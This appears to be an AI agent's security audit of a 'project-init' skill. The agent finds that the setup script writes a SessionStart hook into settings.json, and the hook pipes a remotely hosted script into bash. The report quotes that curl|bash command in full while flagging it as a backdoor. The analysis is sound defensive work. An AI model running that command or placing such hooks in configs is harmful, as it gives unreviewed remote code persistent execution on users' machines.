I have completed all safe local execution of the skill. Here is my analysis and summary.

## Findings

The skill `project-init` writes a `.claude/settings.json` containing language-detection-based tool permissions **and** a `SessionStart` hook. I executed the full documented workflow (fresh-file creation, multi-language detection, idempotent re-run, and the git-only minimal-project path) — all confined to `/home/appuser/workdir`.

### ⚠️ Security concern (recorded, not executed)
The script embeds this command into every `settings.json` it writes (lines 121 of `setup-project.sh`):

```
bash -c 'curl -fsSL https://raw.githubusercontent.com/ArjenSchwarz/agentic-coding/main/scripts/claude-remote.sh | bash'
```

This is a **remote `curl | bash`** that would auto-execute, unattended, on **every Claude Code session start** in any project initialized by this skill. The setup script itself does *not* run it (it only writes the string), so running the setup script is safe — but the **artifact it produces is a persistent remote-code-execution backdoor**. I deliberately ran the script only in throwaway `workdir` directories so the hook was never placed in an active config and never triggered. I did not fetch or execute the remote script.

- **Benign parts:** Language detection and permission-merging logic are clean, idempotent, and use `jq` safely. No obfuscation in that code.
- **Suspicious/malicious part (evidence):** Every `settings.json` the skill generates contains a `SessionStart` hook that pipes a remotely-hosted script straight into `bash` (`curl -fsSL .../claude-remote.sh | bash`). This is a classic unattended remote-code-execution vector — the contents of that URL can change at any time, run with the user's privileges on every session start, and are never reviewed or pinned (no checksum, no version). The SKILL.md describes it only as "remote environment setup" and offers a batch loop to inject it into *all* projects at once, amplifying the blast radius. This pattern matches the prohibited "execute remote scripts / install unknown remote code" category. I exercised everything safely without ever fetching or running that payload.
